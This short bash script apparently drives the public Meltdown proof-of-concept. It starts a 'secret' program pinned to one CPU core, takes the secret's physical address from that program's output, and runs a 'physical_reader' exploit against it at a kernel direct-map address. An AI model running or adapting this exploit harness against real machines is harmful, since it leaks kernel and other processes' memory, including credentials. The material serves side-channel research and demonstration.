#!/bin/bash

TMPNAME="/tmp/xxx_"$$

trap "{ sudo pkill secret; rm -f $TMPNAME; exit; }" SIGINT

sudo taskset 0x4 ./meltdown/secret | tee $TMPNAME &
sleep 1
taskset 0x1 ./meltdown/physical_reader `awk '/Physical address of secret:/{print $6}' $TMPNAME` 0xffff99ee40000000
